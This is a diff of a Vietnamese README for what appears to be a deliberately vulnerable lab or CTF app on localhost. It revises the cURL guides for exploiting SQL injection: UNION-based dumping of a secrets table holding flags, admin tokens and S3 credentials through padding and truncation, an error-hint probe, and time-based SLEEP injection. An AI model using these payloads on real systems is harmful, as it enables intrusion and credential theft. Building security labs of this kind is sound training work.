@@ -51,36 +51,37 @@ docker compose down
 
 ---
 
-## 4. Hướng Dẫn Thử Nghiệm Khai Thác Bằng cURL
+## 4. Hướng Dẫn Thử Nghiệm Khai Thác Bằng cURL (Multi-Parameter Truncation)
 
-### Kịch bản 1: UNION SQLi trích xuất dữ liệu nhạy cảm bảng `system_secrets`
+### Kịch bản 1: UNION SQLi Dump toàn bộ dữ liệu bảng `system_secrets`
 
-Lệnh cURL:
+Lệnh cURL (kết hợp `search` padding 64 ký tự để nuốt cú pháp và `category` chứa payload UNION):
 ```bash
-curl -s "http://localhost:5000/api/products?search=%25%27+UNION+SELECT+1%2Csecret_key%2Csecret_val%2C999%2C1%2Cdescription%2CNOW%28%29+FROM+system_secrets+--+-"
+curl -s "http://localhost:5000/api/products?search=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%27&category=+UNION+SELECT+1%2Csecret_key%2Csecret_val%2C999%2C1%2Cdescription%2CNOW%28%29+FROM+system_secrets+%23"
 ```
 
 - **Lần 1 & 2:** Trả về `{ "success": true, "data": [] }` (Chạy Prepared Statement an toàn).
-- **Lần 3:** Âm thầm kích hoạt Stored Procedure! Toàn bộ FLAG, ADMIN_TOKEN, S3 Credentials từ bảng `system_secrets` sẽ đổ về danh sách sản phẩm.
+- **Lần 3:** Kích hoạt Stored Procedure! Tham số `search` bị cắt cụt nuốt dấu nháy, giải phóng `category` thành câu lệnh UNION SQLi. Toàn bộ FLAG, ADMIN_TOKEN, S3 Credentials từ bảng `system_secrets` đổ về danh sách sản phẩm.
 
 ---
 
-### Kịch bản 2: Boolean-based / Error Blind SQLi (Không để lộ chi tiết lỗi DB)
+### Kịch bản 2: Error Hint Thăm Dò
 
-Lệnh cURL với điều kiện gây lỗi cú pháp nếu đúng:
+Gửi từ khóa `search=test'` 3 lần liên tiếp:
 ```bash
-curl -s "http://localhost:5000/api/products?search=%25%27+AND+%28INVALID+SYNTAX"
+curl -s "http://localhost:5000/api/products?search=test%27"
 ```
-
-- **Lần 1 & 2:** Trả về `{ "success": true, "data": [] }` (Do câu lệnh an toàn bỏ qua lỗi).
-- **Lần 3:** Hệ thống kích hoạt Stored Procedure và trả về lỗi generic chuẩn Production:
+- **Lần 3:** Hệ thống trả về exception hint:
   ```json
   {
     "success": false,
-    "error": "Internal Server Error"
+    "error": "QueryExecutionException: An error occurred while executing procedure [sp_deep_search_products]",
+    "details": {
+      "code": "ER_PARSE_ERROR",
+      "hint": "Buffer boundary exceeded near limit [VARCHAR(64)] in multi-parameter query (name, category)"
+    }
   }
   ```
-- Kỹ thuật viên có thể dựa vào sự khác biệt giữa HTTP 200 (True) và HTTP 500 (False) để trích xuất từng byte dữ liệu (Conditional Error Blind SQLi).
 
 ---
 
@@ -88,14 +89,8 @@ curl -s "http://localhost:5000/api/products?search=%25%27+AND+%28INVALID+SYNTAX"
 
 Lệnh cURL:
 ```bash
-curl -s "http://localhost:5000/api/products?search=notexist%27+OR+SLEEP%282%29+--+-"
+curl -s "http://localhost:5000/api/products?search=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%27&category=+OR+SLEEP%282%29+%23"
 ```
 
 - **Lần 1 & 2:** Phản hồi tức thì (~0.05s).
 - **Lần 3:** Server trễ đúng 2 giây do hàm `SLEEP(2)` được kích hoạt bên trong Stored Procedure.
-
-- **Gửi lần 2:**
-  ```bash
-  curl -s "http://localhost:5000/api/products?search=notexist%27+OR+SLEEP%282%29+--+-"
-  ```
-  *(Server trễ rõ rệt do hàm SLEEP được thực thi bên trong Stored Procedure).*
